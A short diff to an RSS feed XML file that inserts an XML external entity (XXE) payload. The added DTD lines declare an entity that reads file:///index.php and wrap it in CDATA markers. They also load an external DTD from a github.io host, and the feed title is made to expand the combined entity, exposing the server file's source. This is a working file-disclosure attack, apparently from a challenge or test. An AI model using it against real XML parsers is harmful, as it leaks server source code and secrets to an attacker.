@@ -1,6 +1,9 @@
 <!DOCTYPE rss [
- 	<!ENTITY % moresyntax "<!ENTITY foo 'dynamic'>">
-%moresyntax;
+ 	<!ENTITY % file SYSTEM "file:///index.php">
+	<!ENTITY % start "<![CDATA[">
+ 	<!ENTITY % end "]]>">
+	<!ENTITY % dtd SYSTEM "https://joffreyal.github.io/join.dtd">
+%dtd;
 ]>
 <rss version="2.0"
 	xmlns:atom="http://www.w3.org/2005/Atom"
@@ -15,7 +18,7 @@
 		<atom:link href="https://www.lemonde.fr/rss/une.xml" rel="self" type="application/rss+xml"/>
 		<item>
 			<title>
-				&foo;
+				&all;
 			</title>
 			<pubDate>Wed, 17 Mar 2021 09:52:45 +0100</pubDate>
 			<description>
